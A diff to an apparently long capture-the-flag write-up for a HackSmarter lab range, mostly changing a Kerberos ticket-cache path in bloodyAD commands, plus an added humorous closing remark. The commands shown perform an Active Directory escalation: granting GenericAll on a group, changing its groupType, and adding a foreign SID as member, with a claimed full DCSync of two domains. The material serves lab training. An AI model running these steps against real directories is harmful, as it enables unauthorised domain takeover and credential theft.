@@ -3961,7 +3961,7 @@ So the first move converts ownership into actual writability — grant ourselves
 ➜ env KRB5CCNAME=researchoperator.ccache \
 bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
     -u 'researchoperator' \
-    -k ccache=researchoperator.ccache \
+    -k ccache=./researchoperator.ccache \
     add genericAll 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     'S-1-5-21-1978613116-3728955385-531918137-9519'
 
@@ -4004,7 +4004,7 @@ So: two writes, in order —
 ➜ env KRB5CCNAME=researchoperator.ccache \
 bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
     -u 'researchoperator' \
-    -k ccache=researchoperator.ccache \
+    -k ccache=./researchoperator.ccache \
     get object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     --attr groupType --raw
 
@@ -4019,7 +4019,7 @@ First hop up the ladder:
 ```bash
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
     -u 'researchoperator' \
-    -k ccache=researchoperator.ccache \
+    -k ccache=./researchoperator.ccache \
     set object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     groupType -v '-2147483640'
 
@@ -4033,7 +4033,7 @@ Now flip to the final scope:
 ```bash
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
     -u 'researchoperator' \
-    -k ccache=researchoperator.ccache \
+    -k ccache=./researchoperator.ccache \
     set object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     groupType -v '-2147483644'
 
@@ -4047,7 +4047,7 @@ Check the final state to confirm the write stuck:
 ```zsh
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
     -u 'researchoperator' \
-    -k ccache=researchoperator.ccache \
+    -k ccache=./researchoperator.ccache \
     get object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     --attr groupType --raw
 
@@ -4062,7 +4062,7 @@ Now the group accepts cross-domain principals. One subtlety when adding ourselve
 ```bash
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
     -u 'researchoperator' \
-    -k ccache=researchoperator.ccache \
+    -k ccache=./researchoperator.ccache \
     add groupMember 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     'S-1-5-21-1978613116-3728955385-531918137-9519'
 
@@ -4580,3 +4580,7 @@ Even the "hardened" research forest (NTLM disabled, Kerberos-only) fell through 
 **Mission complete: 7 flags · 2 forests · 7 hosts · full DCSync of both domains.**
 
 Thanks to [Tyler Ramsbey](https://www.linkedin.com/in/tylerramsbey), founder of HackSmarter, for the platform, and to my teammate [2ubZ3r0](https://2ubz3r0.com/) for the Westbridge range design. 🔥
+
+---
+
+> Clocking in at 4,600 lines, this post is less of a standard technical walkthrough and more of an unfinished 19th-century Russian psychological novel—dense, exhausting, and perpetually hovering just a few chapters short of a clean ending, where the only true existential dread comes from misconfigured enterprise trust boundaries.
